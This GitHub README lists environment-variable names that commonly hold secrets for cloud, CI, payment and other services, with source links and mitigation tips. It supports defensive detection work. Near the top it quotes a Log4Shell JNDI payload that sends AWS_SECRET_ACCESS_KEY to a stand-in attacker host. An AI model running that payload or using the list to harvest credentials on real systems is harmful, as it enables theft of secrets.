<div align="center" >🤝 Show your support - give a ⭐️ if you liked the content | <a target="_blank" href='https://twitter.com/intent/tweet?url=https%3A%2F%2Fgithub.com%2FPuliczek%2Fawesome-list-of-secrets-in-environment-variables&via=pulik_io&text=Awesome%20list%20of%20secrets%20in%20environment%20variables'>SHARE on Twitter</a>
| Follow me on
 <a target="_blank" href='https://twitter.com/pulik_io'><img src='https://img.shields.io/badge/Twitter-%231DA1F2.svg?&style=flat&logo=twitter&logoColor=white'/></a>
 <a target="_blank" href='https://www.youtube.com/channel/UCaAdOBH2hnqLvEri1M7eg5Q'><img src='https://img.shields.io/badge/YouTube-%23FF0000.svg?&style=flat&logo=youtube&logoColor=white'/></a>
</div>

---

# **Awesome list of secrets in environment variables [![Awesome](https://awesome.re/badge.svg)](https://awesome.re)**

# 📝 Description

List of secrets, passwords, API keys, tokens stored inside a system environment variables.

**An environment variable** is a variable whose value is set outside the program, typically through functionality built into the operating system or microservice.

Many developer documentations recommends storing secrets inside an environment variable, but is it the best way to keep secrets?

The attacker can read values inside system environment variable by using exploits:
- CVE-2021-44228 JNDI log4j (JAVA) ([Read more...](https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words#1-system-environment-variables))
 
  `${jndi:ldap://somesitehackerofhell.com/z?leak=${env:AWS_SECRET_ACCESS_KEY:-NO_EXISTS}}`

  Get **AWS_SECRET_ACCESS_KEY** or return **NO_EXISTS**
- CVE-XXXX-XXXX Web browser attack (Writeup/POC coming soon to my Github - Follow me on [Github](https://github.com/Puliczek) and [Twitter](https://twitter.com/pulik_io) 😉
- and much more...

Because of that I created, a list of secrets in environment variables to help secure software. 

Some of practices to avoid leak of secrets stored in environment variables is to:
- Block/notify on WAF when the request includes system environment variables
- Store in system environment variable path to a config file, instead of clean value
- Encrypt values inside environment variable
- Use different way to store secrets 🤓

![Environment variables](https://user-images.githubusercontent.com/12344862/147656611-8726c036-128b-4ad4-a19b-c019c2d6b1ea.png)


You can check your system environment variables:
- Windows execute in PowerShell: `dir env:`
- Linux/MacOS execute in terminal: `printenv` or `env`


# **Awesome list of secrets in environment variables**
# A
## AWS
- AWS_ACCESS_KEY_ID
- AWS_SECRET_ACCESS_KEY
- AMAZON_AWS_ACCESS_KEY_ID
- AMAZON_AWS_SECRET_ACCESS_KEY

source: https://docs.aws.amazon.com/sdkref/latest/guide/setting-global-aws_secret_access_key.html

## Algolia
- ALGOLIA_API_KEY

source: https://www.algolia.com/doc/framework-integration/symfony/getting-started/installation/?client=php
## Azure
- AZURE_CLIENT_ID
- AZURE_CLIENT_SECRET
- AZURE_USERNAME
- AZURE_PASSWORD
- MSI_ENDPOINT
- MSI_SECRET
  
source: https://docs.microsoft.com/en-us/dotnet/api/azure.identity.environmentcredential?view=azure-dotnet
<br>
source: https://techcommunity.microsoft.com/t5/azure-developer-community-blog/understanding-azure-msi-managed-service-identity-tokens-caching/ba-p/337406
# B
## Binance
- binance_api
- binance_secret
  
source: https://algotrading101.com/learn/binance-python-api-guide/

## Bittrex
- BITTREX_API_KEY
- BITTREX_API_SECRET

source: https://github.com/TeamWertarbyte/crypto-trading-bot/blob/development/README.md
# C
## Cloud Foundry
- CF_PASSWORD
- CF_USERNAME

source: https://cli.cloudfoundry.org/en-US/v6/auth.html

## Code Climate
- CODECLIMATE_REPO_TOKEN

source: https://docs.codeclimate.com/docs/command-line-interface

## Coveralls
- COVERALLS_REPO_TOKEN

source: https://docs.coveralls.io/supported-ci-services

## CircleCI
- CIRCLE_TOKEN

source: https://circleci.com/docs/2.0/api-developers-guide/
# D
## Digitalocean
- DIGITALOCEAN_ACCESS_TOKEN
  
source: https://github.com/digitalocean/doctl#authenticating-with-digitalocean

## Dockerhub
- DOCKER_EMAIL
- DOCKER_PASSWORD
- DOCKER_USERNAME

source: https://github.com/marketplace/actions/publish-docker
## Dockerhub
- DOCKERHUB_PASSWORD

source: https://circleci.com/docs/2.0/env-vars/
# E
# F
## Fastlane products
- ITC_PASSWORD 

source: https://github.com/phatblat/fastlane-variables
## Facebook 
- FACEBOOK_APP_ID
- FACEBOOK_APP_SECRET
- FACEBOOK_ACCESS_TOKEN

## Firebase
- FIREBASE_TOKEN

source: https://firebase.google.com/docs/cli

## Fossa
- FOSSA_API_KEY

source: https://docs.fossa.com/docs/api-reference

# G
## Github
- GH_TOKEN
- GITHUB_TOKEN 
- GH_ENTERPRISE_TOKEN
- GITHUB_ENTERPRISE_TOKEN 

source: https://cli.github.com/manual/gh_help_environment 

## Gitlab
- CI_DEPLOY_PASSWORD
- CI_DEPLOY_USER

source: https://docs.gitlab.com/ee/user/project/deploy_tokens/

## Google Cloud
- GOOGLE_APPLICATION_CREDENTIALS
- GOOGLE_API_KEY
  
source: https://cloud.google.com/docs/authentication/getting-started#windows

## Gitlab
- CI_DEPLOY_USER
- CI_DEPLOY_PASSWORD
- GITLAB_USER_LOGIN
- CI_JOB_JWT
- CI_JOB_JWT_V2
- CI_JOB_TOKEN

source: https://docs.gitlab.com/ee/ci/variables/predefined_variables.html
# H

## Heroku
- HEROKU_API_KEY
- HEROKU_API_USER

source: https://devcenter.heroku.com/articles/authentication
# I
# J
# K
# L
# M
## Mailgun
- MAILGUN_API_KEY
  
source: https://www.pulumi.com/registry/packages/mailgun/installation-configuration/

## MongoDB
- MCLI_PRIVATE_API_KEY
- MCLI_PUBLIC_API_KEY

https://docs.mongodb.com/mongocli/stable/configure/environment-variables/
# N

## NGROK
- NGROK_TOKEN
- NGROK_AUTH_TOKEN

source: -
## NPM
- NPM_TOKEN 
- NPM_AUTH_TOKEN

source: https://docs.npmjs.com/using-private-packages-in-a-ci-cd-workflow

# O
## OKTA
- OKTA_CLIENT_ORGURL
- OKTA_CLIENT_TOKEN
- OKTA_OAUTH2_CLIENTSECRET
- OKTA_OAUTH2_CLIENTID
- OKTA_AUTHN_GROUPID

source: https://developer.okta.com/okta-sdk-java/apidocs/com/okta/sdk/client/ClientBuilder.html
## Oracle OpenStack command-line client
- OS_USERNAME
- OS_PASSWORD

source: [https://docs.openstack.org/ocata/user-guide/common/cli-set-environment-variables-using-openstack-rc.html](https://docs.openstack.org/ocata/user-guide/common/cli-set-environment-variables-using-openstack-rc.html)
<br>
source: https://docs.oracle.com/cd/E78305_01/E78304/html/openstack-envars.html

# P
## Percy.io
- PERCY_TOKEN

source: https://docs.percy.io/docs/environment-variables

## PostgreSQL
- POSTGRES_PASSWORD

source: https://www.postgresql.org/docs/current/libpq-envars.html

# Q
# R
# S
## Sauce Labs
- SAUCE_ACCESS_KEY
- SAUCE_USERNAME

source: https://docs.saucelabs.com/basics/environment-variables/

## Sentry
- SENTRY_AUTH_TOKEN

source: https://docs.sentry.io/product/cli/configuration/

## Slack
- SLACK_TOKEN

source: https://slack.dev/node-slack-sdk/getting-started

## Square
- square_access_token
- square_oauth_secret

source: https://www.npmjs.com/package/square/v/12.0.0?activeTab=readme

## Stripe
- STRIPE_API_KEY
- STRIPE_DEVICE_NAME

source: https://stripe.com/docs/cli/api_keys

## Surge
- SURGE_TOKEN
- SURGE_LOGIN

source: https://surge.sh/help/integrating-with-circleci

# T
## Twilio
- TWILIO_ACCOUNT_SID
- TWILIO_AUTH_TOKEN 

Source: https://www.twilio.com/blog/2017/01/how-to-set-environment-variables.html

## Twitter
- CONSUMER_KEY
- CONSUMER_SECRET

source: https://developer.twitter.com/en/docs/authentication/guides/authentication-best-practices

## Travis Ci
- TRAVIS_SUDO
- TRAVIS_OS_NAME
- TRAVIS_SECURE_ENV_VARS

source: https://docs.travis-ci.com/user/environment-variables
# U
# V
## Vault HashiCorp
- VAULT_TOKEN
- VAULT_CLIENT_KEY
  
source: https://www.vaultproject.io/docs/commands

## Vultr
- TOKEN
- VULTR_ACCESS
- VULTR_SECRET

source: https://www.vultr.com/docs/deploying-javascript-unikernels-to-vultr-with-ops
# W
# X
# Y
# Z

## Get a RAW list:

The repository includes the raw list:

[raw_list.txt](https://github.com/Puliczek/awesome-list-of-secrets-in-environment-variables/blob/main/raw_list.txt)

It is auto-generated from README.md by GitHub action.
   
# 😎 Contributing
👍🎉 First off, thanks for taking the time to contribute! 🎉👍

If you would like to add more secrets:
<br>
[Please read and follow our Contributing guide](https://github.com/Puliczek/awesome-list-of-secrets-in-environment-variables/blob/main/CONTRIBUTING.md)

Thanks! 🦄

# 💻 Useful links

- [Stackoverflow - Is it secure to store passwords as environment variables (rather than as plain text) in config files?](https://stackoverflow.com/questions/12461484/is-it-secure-to-store-passwords-as-environment-variables-rather-than-as-plain-t)
- [Google - Best practices for securely using API keys](https://support.google.com/googleapi/answer/6310037?hl=en)
- [An Introduction to Environment Variables and How to Use Them](https://medium.com/chingu/an-introduction-to-environment-variables-and-how-to-use-them-f602f66d15fa)
- [Why you shouldn't use ENV variables for secret data](https://diogomonica.com/2017/03/27/why-you-shouldnt-use-env-variables-for-secret-data/)
- [The Triumph and Tragedy of .env Files](https://blog.doppler.com/the-triumph-and-tragedy-of-env-files)

# 🤝 Show your support

<div>🤝 Show your support - give a ⭐️ if you liked the content | <a target="_blank" href='https://twitter.com/intent/tweet?url=https%3A%2F%2Fgithub.com%2FPuliczek%2Fawesome-list-of-secrets-in-environment-variables&via=pulik_io&text=Awesome%20list%20of%20secrets%20in%20environment%20variables'>SHARE on Twitter</a>
| Follow me on
 <a target="_blank" href='https://twitter.com/pulik_io'><img src='https://img.shields.io/badge/Twitter-%231DA1F2.svg?&style=flat&logo=twitter&logoColor=white'/></a>
 <a target="_blank" href='https://www.youtube.com/channel/UCaAdOBH2hnqLvEri1M7eg5Q'><img src='https://img.shields.io/badge/YouTube-%23FF0000.svg?&style=flat&logo=youtube&logoColor=white'/></a>
</div>

# ✔️ Disclaimer
This project can only be used for educational purposes. Using this software against target systems without prior permission is illegal, and any damages from misuse of this software will not be the responsibility of the author.
